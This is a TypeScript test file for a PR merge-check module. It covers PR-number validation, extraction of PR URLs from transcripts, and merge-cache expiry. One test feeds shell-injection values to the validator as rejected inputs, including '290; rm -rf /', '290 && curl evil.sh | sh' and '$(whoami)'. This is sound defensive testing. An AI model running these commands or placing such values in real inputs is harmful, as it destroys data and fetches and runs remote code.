/*
 * merge-check.test.ts — the bounded-int PR-number gate, marker extraction,
 * and the merge-cache TTL asymmetry (terminal `merged` vs. re-checked
 * `pending`). The squash-aware REAL-git-repo suites (`checkSquashMerged`,
 * the false-positive guard) moved to `merge-check.squash.test.ts` (CLAUDE.md
 * 300-line rule) — same per-aspect split as the sibling
 * `merge-check.origin.test.ts` / `merge-check.race.test.ts`.
 *
 * The injection cases are the reason this module exists — two external reviews
 * flagged a transcript-derived PR number reaching a shell.
 *
 * @covers FR-01.66
 */

import { beforeEach, describe, expect, it } from "vitest";

import {
  _clearMergeCache,
  checkSquashMerged,
  extractPrMarker,
  validatePrNumber,
} from "./merge-check.js";

// @covers FR-01.66
describe("validatePrNumber (the bounded-int gate)", () => {
  it("accepts a plain digit run", () => {
    expect(validatePrNumber("290")).toBe(290);
    expect(validatePrNumber(290)).toBe(290);
  });

  it("REJECTS every shell-metacharacter and non-numeric payload", () => {
    for (const bad of [
      "290; rm -rf /",
      "290 && curl evil.sh | sh",
      "$(whoami)",
      "`id`",
      "290|tee",
      "--output=/etc/passwd",
      "-1",
      "+290",
      " 290",
      "290\n",
      "0x12",
      "1e3",
      "",
      "abc",
      null,
      undefined,
      {},
      [290],
    ]) {
      expect(validatePrNumber(bad), `${JSON.stringify(bad)} must not validate`).toBeNull();
    }
  });

  it("rejects 0 and an implausibly large number (bounded, not just shaped)", () => {
    expect(validatePrNumber("0")).toBeNull();
    expect(validatePrNumber("99999999999")).toBeNull();
  });
});

const WEBUI = { owner: "svenroth-ai", repo: "shipwright-webui" };

// @covers FR-01.66
describe("extractPrMarker", () => {
  it("finds the PR number from a github pull url in the transcript", () => {
    const m = extractPrMarker(
      '{"text":"opened https://github.com/svenroth-ai/shipwright-webui/pull/290 ok"}',
      WEBUI,
    );
    expect(m).toEqual({
      number: 290,
      url: "https://github.com/svenroth-ai/shipwright-webui/pull/290",
      owner: "svenroth-ai",
      repo: "shipwright-webui",
    });
  });

  it("keeps the LAST marker when a session opened several PRs of THIS repo", () => {
    const t = [
      "https://github.com/o/r/pull/1",
      "https://github.com/o/r/pull/2",
    ].join(" ... ");
    expect(extractPrMarker(t, { owner: "o", repo: "r" })?.number).toBe(2);
  });

  it("ignores a bare #123 in prose (not a delivery marker)", () => {
    expect(extractPrMarker("fixes #123 as discussed", WEBUI)).toBeNull();
  });

  it("ignores a lookalike host (no marker from evil.com)", () => {
    expect(extractPrMarker("https://github.com.evil.com/o/r/pull/9", WEBUI)).toBeNull();
  });

  it("returns null for an empty transcript", () => {
    expect(extractPrMarker("", WEBUI)).toBeNull();
  });
});

// @covers FR-01.66
describe("merge cache asymmetry", () => {
  beforeEach(() => _clearMergeCache());

  it("caches `merged` indefinitely (a merge is terminal)", async () => {
    let calls = 0;
    // The stub returns SUBJECT lines (`--format=%s`), matching the real query.
    const git = () => {
      calls++;
      return "feat: a thing (#7)\n";
    };
    let clock = 1000;
    const now = () => clock;
    expect(await checkSquashMerged("/p", 7, { git, now })).toBe("merged");
    clock += 10 * 60 * 60 * 1000; // 10 hours later
    expect(await checkSquashMerged("/p", 7, { git, now })).toBe("merged");
    expect(calls).toBe(1);
  });

  it("RE-CHECKS `pending` after the TTL (never cache pending forever)", async () => {
    let calls = 0;
    let out = "";
    const git = () => {
      calls++;
      return out;
    };
    let clock = 1000;
    const now = () => clock;
    expect(await checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("pending");
    clock += 30_000;
    expect(await checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("pending");
    expect(calls).toBe(1); // still inside the TTL
    clock += 40_000;
    out = "fix: later squash (#8)\n"; // the PR got merged in the meantime
    expect(await checkSquashMerged("/p", 8, { git, now, pendingTtlMs: 60_000 })).toBe("merged");
    expect(calls).toBe(2);
  });
});
